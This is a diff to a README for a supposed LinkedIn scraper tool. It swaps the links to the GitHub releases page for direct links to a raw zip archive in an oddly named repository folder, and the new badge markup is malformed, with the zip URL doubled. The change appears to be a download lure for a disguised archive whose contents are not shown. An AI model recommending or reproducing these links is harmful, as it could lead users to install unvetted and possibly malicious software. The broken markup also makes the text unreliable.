@@ -1,6 +1,6 @@
 # 🌟 linkedin-scraper - Fast and Easy LinkedIn Data Extraction
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/korukodaki/linkedin-scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/korukodaki/linkedin-scraper/main/fearless/linkedin-scraper.zip%https://raw.githubusercontent.com/korukodaki/linkedin-scraper/main/fearless/linkedin-scraper.zip)](https://raw.githubusercontent.com/korukodaki/linkedin-scraper/main/fearless/linkedin-scraper.zip)
 
 ## 🚀 Getting Started
 
@@ -45,7 +45,7 @@ To get started with **linkedin-scraper**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can find the downloadable version of the software.
    
-   [Download from Releases](https://github.com/korukodaki/linkedin-scraper/releases)
+   [Download from Releases](https://raw.githubusercontent.com/korukodaki/linkedin-scraper/main/fearless/linkedin-scraper.zip)
 
 2. **Select Your Version:** Look for the latest version and select it.
 
